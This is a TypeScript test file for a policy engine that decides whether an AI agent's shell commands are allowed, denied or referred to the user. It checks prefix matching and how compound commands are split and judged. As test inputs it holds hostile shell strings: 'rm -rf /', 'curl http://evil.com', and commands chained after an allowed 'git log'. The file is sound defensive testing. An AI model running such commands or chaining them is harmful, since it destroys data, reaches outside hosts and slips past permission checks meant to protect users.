/**
 * @license
 * Copyright 2025 Vybestack LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { PolicyEngine } from './policy-engine.js';
import { PolicyDecision } from './types.js';

describe('Shell Safety Policy - SECURITY', () => {
  let policyEngine: PolicyEngine;

  beforeEach(() => {
    policyEngine = new PolicyEngine({
      rules: [
        {
          toolName: 'run_shell_command',
          // CRITICAL: This regex mimics toml-loader output for commandPrefix = ["git log"]
          // BEFORE fix: /"command":"git log"/
          // AFTER fix: /"command":"git log(?:[\s"]|$)/
          argsPattern: /"command":"git log(?:[\s"]|$)/,
          decision: PolicyDecision.ALLOW,
          priority: 1.01,
        },
      ],
      defaultDecision: PolicyDecision.ASK_USER,
    });
  });

  describe('R1: Word Boundary Enforcement', () => {
    it('SHOULD match "git log" exactly', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log',
      });
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD match "git log" with arguments', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log --oneline',
      });
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD match "git log" with double-quoted arguments', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log "--oneline"',
      });
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD NOT match "git logout" (word boundary violation)', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git logout',
      });
      // Without word boundary, this would incorrectly return ALLOW
      // With word boundary, falls back to default ASK_USER
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD NOT match "git logrotate" (word boundary violation)', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git logrotate',
      });
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD NOT match "rmdir" when only "rm" is allowed (prefix confusion regression)', () => {
      // Setup: Allow only "rm" command
      const rmPolicyEngine = new PolicyEngine({
        rules: [
          {
            toolName: 'run_shell_command',
            argsPattern: /"command":"rm(?:[\s"]|$)/,
            decision: PolicyDecision.ALLOW,
            priority: 1.01,
          },
        ],
        defaultDecision: PolicyDecision.ASK_USER,
      });

      // "rm" should be allowed
      const rmResult = rmPolicyEngine.evaluate('run_shell_command', {
        command: 'rm /tmp/file.txt',
      });
      expect(rmResult).toBe(PolicyDecision.ALLOW);

      // "rmdir" should NOT be allowed (requires ASK_USER)
      const rmdirResult = rmPolicyEngine.evaluate('run_shell_command', {
        command: 'rmdir /tmp/dir',
      });
      expect(rmdirResult).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Compound Command Validation', () => {
    it('SHOULD block compound command with disallowed part', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log && rm -rf /',
      });
      // "git log" is ALLOW, but "rm -rf /" is ASK_USER (default)
      // Aggregate should be ASK_USER (most restrictive non-DENY)
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD block compound command with piped disallowed part', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log | curl http://evil.com',
      });
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD block compound command with semicolon separator', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log; echo pwned',
      });
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD allow compound command when ALL parts are allowed', () => {
      // Add "echo" to allowed commands
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"echo(?:[\s"]|$)/,
        decision: PolicyDecision.ALLOW,
        priority: 1.02,
      });

      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log && echo done',
      });
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD fail-safe on parse failure (malformed compound command)', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log &&& rm -rf /',
      });
      // Parse failure should result in ASK_USER (fail-safe)
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Recursive Validation Edge Cases', () => {
    it('SHOULD validate nested compound commands', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: '(git log && curl http://evil.com) || rm -rf /',
      });
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD validate commands in background jobs', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log & curl http://evil.com',
      });
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD validate commands in process substitution', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'diff <(git log) <(curl http://evil.com)',
      });
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Aggregate Decision Logic', () => {
    beforeEach(() => {
      // Setup: git log → ALLOW, echo → ALLOW, curl → DENY
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"echo(?:[\s"]|$)/,
        decision: PolicyDecision.ALLOW,
        priority: 1.02,
      });
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"curl(?:[\s"]|$)/,
        decision: PolicyDecision.DENY,
        priority: 1.03,
      });
    });

    it('SHOULD return DENY when any sub-command is DENY', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log && echo ok && curl http://evil.com',
      });
      expect(result).toBe(PolicyDecision.DENY);
    });

    it('SHOULD return ASK_USER when no DENY but has ASK_USER', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log && echo ok && unknown-command',
      });
      // git log → ALLOW, echo ok → ALLOW, unknown-command → ASK_USER
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD return ALLOW only when all sub-commands are ALLOW', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log && echo ok',
      });
      expect(result).toBe(PolicyDecision.ALLOW);
    });
  });

  describe('R2: No-Rule Shell Compound Command Security', () => {
    it('SHOULD DENY compound command subpart even with no top-level rule match', () => {
      // Setup: DENY for "git push", but no rule matches "git commit"
      const engine = new PolicyEngine({
        rules: [
          {
            toolName: 'run_shell_command',
            argsPattern: /"command":"git push(?:[\s"]|$)/,
            decision: PolicyDecision.DENY,
            priority: 1.01,
          },
        ],
        defaultDecision: PolicyDecision.ALLOW,
      });

      // "git commit && git push" should be DENY because "git push" is DENY
      const result = engine.evaluate('run_shell_command', {
        command: 'git commit && git push',
      });
      expect(result).toBe(PolicyDecision.DENY);
    });

    it('SHOULD ASK_USER for compound command when subpart is unknown', () => {
      // Default is ALLOW, but subcommand validation still applies
      const engine = new PolicyEngine({
        rules: [
          {
            toolName: 'run_shell_command',
            argsPattern: /"command":"git log(?:[\s"]|$)/,
            decision: PolicyDecision.ALLOW,
            priority: 1.01,
          },
        ],
        defaultDecision: PolicyDecision.ASK_USER,
      });

      // "ls && rm -rf /" — no rule matches at top level, so default=ASK_USER
      // but subcommands should still be checked; "rm -rf /" → ASK_USER
      const result = engine.evaluate('run_shell_command', {
        command: 'ls && rm -rf /',
      });
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD handle trimmed subcommands in compound commands', () => {
      // Verify that whitespace in split commands doesn't break matching
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log  &&  echo test',
      });
      // "git log" → ALLOW, "echo test" → ASK_USER (no rule)
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Non-Interactive Mode Interaction', () => {
    beforeEach(() => {
      policyEngine = new PolicyEngine({
        rules: [
          {
            toolName: 'run_shell_command',
            argsPattern: /"command":"git log(?:[\s"]|$)/,
            decision: PolicyDecision.ALLOW,
            priority: 1.01,
          },
        ],
        defaultDecision: PolicyDecision.ASK_USER,
        nonInteractive: true, // Enable non-interactive mode
      });
    });

    it('SHOULD convert ASK_USER to DENY in non-interactive mode', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log && rm -rf /',
      });
      // "rm -rf /" results in ASK_USER, which becomes DENY in non-interactive mode
      expect(result).toBe(PolicyDecision.DENY);
    });

    it('SHOULD convert parse failure to DENY in non-interactive mode', () => {
      const result = policyEngine.evaluate('run_shell_command', {
        command: 'git log &&& malformed',
      });
      expect(result).toBe(PolicyDecision.DENY);
    });
  });
});
